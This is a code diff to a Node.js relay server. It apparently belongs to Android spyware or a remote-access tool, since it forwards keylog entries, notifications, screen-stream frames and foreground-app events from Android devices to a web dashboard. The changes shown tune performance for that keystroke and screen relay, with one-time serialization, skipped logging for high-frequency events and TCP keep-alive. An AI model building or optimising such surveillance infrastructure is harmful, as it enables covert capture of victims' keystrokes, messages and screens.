@@ -360,9 +360,13 @@ function sseSend(clientId, event, data) {
 
 /** Broadcast an event to ALL connected SSE dashboard clients */
 function broadcastDash(event, data) {
+    if (sseClients.size === 0) return;
+    // Pre-serialize once — avoids re-running JSON.stringify (which is expensive for large
+    // stream:frame payloads) for every connected dashboard tab.
+    const payload = `data: ${JSON.stringify({ event, data })}\n\n`;
     for (const [id, client] of sseClients) {
         if (!client.res.writableEnded) {
-            client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
+            client.res.write(payload);
             if (typeof client.res.flush === 'function') client.res.flush();
         }
     }
@@ -373,8 +377,14 @@ function broadcastDash(event, data) {
 // Both TCP and WS messages go through here
 // ============================================
 async function processMessage(clientId, clientType, event, data) {
-    log(clientType === 'android' ? 'TCP' : 'WS',
-        `← [${clientId}] ${event}`);
+    // Skip per-message log for high-frequency events — logging every frame/keylog/notification
+    // iterates all log clients and adds measurable latency on the hot relay path.
+    const highFreq = event === 'stream:frame' || event === 'keylog:entry' ||
+                     event === 'notification:entry' || event === 'app:foreground' ||
+                     event === 'device:heartbeat' || event === 'device:pong';
+    if (!highFreq) {
+        log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
+    }
 
     // ── Events expected from Android (TCP) ──────────────────────────
     if (event === 'device:register') {
@@ -642,7 +652,8 @@ const tcpServer = net.createServer((conn) => {
     tcpClients.set(id, conn);
     log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);
 
-    conn.setNoDelay(true);   // disable Nagle — relay keylog/notif/frames immediately
+    conn.setNoDelay(true);          // disable Nagle — relay data immediately
+    conn.setKeepAlive(true, 5000);  // detect dead sockets within ~5 s
     conn.setEncoding('utf8');
 
     conn.on('data', (chunk) => {
